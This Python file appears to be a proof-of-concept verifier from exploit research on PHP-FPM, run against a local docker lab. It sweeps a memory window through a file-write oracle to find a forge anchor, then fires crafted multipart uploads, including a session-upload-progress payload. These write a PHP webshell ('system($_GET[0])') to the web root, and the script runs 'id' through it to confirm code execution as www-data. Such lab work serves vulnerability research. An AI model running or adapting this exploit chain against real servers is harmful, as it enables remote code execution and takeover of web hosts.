#!/usr/bin/env python3
"""Verify blind_anchor_oracle: locate the K-free forge anchor X* black-box via the
EXACT file-write oracle over a bounded window, then fire the forge at the LOCATED X*
-> uid=33, worker survives.

The sweep window stands in for a per-build range or a leak-supplied prior: the cheap
crash-bsearch narrowing is refuted (see blind_anchor_oracle docstring), so a window is
the honest residual. The window here is deliberately NOT centered on the answer.

Lab: profile fpmfire (single-worker php:8.4.26-fpm behind nginx, writable /pub):
    docker compose -f docker-compose.fpm-avenues.yml --profile fpmfire up -d --build
    # nginx 127.0.0.1:18085
Run (slow: fresh container per probe):
    python3 -I poc/primitives/oracles/verify_blind_anchor_oracle.py [--loud]

PASS = the sweep locates x_star, it equals the known SETTLED anchor (d_choff -
carrier_base, cross-check only), AND the forge at the LOCATED x_star writes the
webshell + a plain GET fires it (uid=33(www-data)) + worker survives. --loud adds a
/proc observer d_choff assertion on the final fire (lab instrument).

The locator consumes ONLY a ps_files-relative residue (ps_files - carrier_base) and
the arm-fixed ARM_DELTA; d_choff, carrier_base and fakee are NOT supplied.
"""
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.oracles.blind_anchor_oracle import (  # noqa: E402
    ARM_DELTA, forge_carrier, sweep_anchor)
from primitives.write.kfree_stagefed_forge import (  # noqa: E402
    SETTLED_CONST, arm_parts, pretouch_parts, backing_field)
from common.multipart import multipart_tuple, part_tuple  # noqa: E402

REPO = os.path.dirname(_POC_ROOT)
COMPOSE_FILE = os.path.join(REPO, "docker-compose.fpm-avenues.yml")
LAB = os.path.join(REPO, "lab", "fpmfire")
BASE = "http://127.0.0.1:18085"
PROFILE = "fpmfire"
CONTAINER = "p2s-fpmfire-fpm"
SID = "sess0000000000000000000000000001"
SF = "/tmp/sess_" + SID
WEBSHELL = b"<?php system($_GET[0]);?>"
TARGET = "/var/www/html/pub/pwned.php"
URLPATH = "/pub/pwned.php"
BND = b"----l2"

RESIDUE = SETTLED_CONST["ps_files"] - SETTLED_CONST["carrier_base"]   # the lone residue
KNOWN_XSTAR = SETTLED_CONST["d_choff"] - SETTLED_CONST["carrier_base"]  # cross-check target
# search window for X (would come from a per-build range or a leak; the cheap crash-bsearch
# narrowing is refuted -- see blind_anchor_oracle docstring). Deliberately NOT centered on
# the answer: a nominal prior 2 pages off, swept outward, must still locate the exact page.
WIN_LO, WIN_HI, WIN_CENTER = 0x142000, 0x14d000, 0x149000


def comp(*a, t=180):
    return subprocess.run(["docker", "compose", "-f", COMPOSE_FILE, "--profile", PROFILE, *a],
                          cwd=REPO, capture_output=True, text=True, timeout=t)


def dx(*c, t=30):
    return subprocess.run(["docker", "exec", CONTAINER, *c], capture_output=True, text=True, timeout=t).stdout


def http(path, data=None, ct=None, t=90, cookie=False):
    req = urllib.request.Request(BASE + path, data=data)
    if ct:
        req.add_header("Content-Type", ct)
    if cookie:
        req.add_header("Cookie", "PHPSESSID=" + SID)
    try:
        with urllib.request.urlopen(req, timeout=t) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return None, repr(e).encode()


def wpid():
    s, b = http("/probe.php", t=8)
    return b.split(b":", 1)[1].decode().strip() if (s == 200 and b.startswith(b"ALIVE:")) else None


def ready():
    for _ in range(80):
        if wpid():
            return True
        time.sleep(0.5)
    return False


def _fresh():
    comp("down", t=90)
    comp("up", "-d", t=150)
    return ready()


def _arm_once():
    """seed session, pretouch BOTH endpoints (settled), read p0, fire the arm. NO plain
    request may touch the worker between here and the stage (would memset the dangle)."""
    dx("sh", "-c", f"printf %s 'aa|i:9;bb|i:2;' > {SF}; chown www-data {SF}")
    pb, ph = multipart_tuple(pretouch_parts(), BND)
    http("/arm.php", data=pb, ct=ph["Content-Type"])
    http("/echo.php")
    p0 = wpid()
    ab, ah = multipart_tuple(arm_parts(), BND)
    http("/arm.php", data=ab, ct=ah["Content-Type"])
    return p0


def _stage(carrier):
    parts = [part_tuple("C", carrier),
             part_tuple("B", backing_field(TARGET, SETTLED_CONST)), part_tuple("B", b"x"),
             part_tuple("PHP_SESSION_UPLOAD_PROGRESS", WEBSHELL),
             part_tuple("f", b"Z" * 64, filename="a.bin", ctype="application/octet-stream")]
    sb, sh = multipart_tuple(parts, BND)
    http("/echo.php", data=sb, ct=sh["Content-Type"], cookie=True, t=30)


def probe_write(X, loud=False):
    if not _fresh():
        raise RuntimeError("boot")
    try:
        carrier = forge_carrier(X, RESIDUE)
    except ValueError:
        print(f"  [fine] X=0x{X:x} skip(oob)", flush=True)
        return False
    _arm_once()
    _stage(carrier)
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    print(f"  [fine] X=0x{X:x} wrote={wrote}", flush=True)
    return wrote


def final_fire(x_star, loud):
    if not _fresh():
        return False, "boot", None
    if loud:
        subprocess.run(["docker", "cp", os.path.join(LAB, "observer.php"),
                        f"{CONTAINER}:/tmp/observer.php"], capture_output=True)
    p0 = _arm_once()
    dch = None
    if loud:
        for tok in dx("php", "/tmp/observer.php").split():
            if tok.startswith("unser.data="):
                dch = int(tok.split("=")[1], 16) & 0x1fffff
    _stage(forge_carrier(x_star, RESIDUE))
    ls = dx("sh", "-c", f"ls {TARGET} 2>&1").strip()
    wrote = TARGET in ls and "No such" not in ls
    nonce = "FIRE%08x" % int.from_bytes(os.urandom(4), "big")
    body = ""
    if wrote:
        s, b = http(f"{URLPATH}?0={urllib.parse.quote('echo ' + nonce + ';id')}", t=15)
        body = (b or b"").decode("latin-1", "replace")
    p1 = wpid()
    uid = re.search(r"uid=\d+\([^)]*\)", body)
    fired = (nonce in body) and bool(re.search(r"uid=\d+\(www-data\)", body))
    surv = p1 is not None and p1 == p0
    return (wrote and fired and surv), (f"wrote={wrote} fired={fired} surv={surv} "
            f"uid='{uid.group(0) if uid else 'n/a'}' p=({p0},{p1})"
            + (f" d_choff=0x{(dch or 0):x}" if loud else "")), dch


def main():
    loud = "--loud" in sys.argv
    if subprocess.run(["docker", "version"], capture_output=True).returncode != 0:
        print("SKIP: docker unavailable"); return
    print(f"# blind anchor file-write oracle, black-box (no gdb/leak). residue=0x{RESIDUE & 0xffffffffffff:x} "
          f"arm_delta=0x{ARM_DELTA:x} known_xstar=0x{KNOWN_XSTAR:x} "
          f"window=[0x{WIN_LO:x},0x{WIN_HI:x}) center=0x{WIN_CENTER:x}", flush=True)
    xs = sweep_anchor(lambda X: probe_write(X, loud), WIN_LO, WIN_HI, center=WIN_CENTER)
    print(f"\n# located x_star={('0x%x' % xs) if xs is not None else 'NONE'}", flush=True)
    if xs is None:
        comp("down", t=90)
        print("\nFAIL: oracle did not locate x_star"); return
    xmatch = (xs == KNOWN_XSTAR)
    print(f"# x_star vs known d_choff-carrier_base: {'MATCH' if xmatch else 'MISMATCH'} "
          f"(derived 0x{xs:x} vs 0x{KNOWN_XSTAR:x})", flush=True)
    ok, line, _ = final_fire(xs, loud)
    print(f"# final fire at DERIVED x_star=0x{xs:x}: {line} -> {'PASS' if ok else 'FAIL'}", flush=True)
    comp("down", t=90)
    overall = ok and xmatch
    print(f"\n{'PASS' if overall else 'FAIL'}: black-box anchor derivation -> forge fired "
          f"(uid-in-hand), x_star {'matches' if xmatch else 'MISMATCHES'} ground truth", flush=True)


if __name__ == "__main__":
    main()
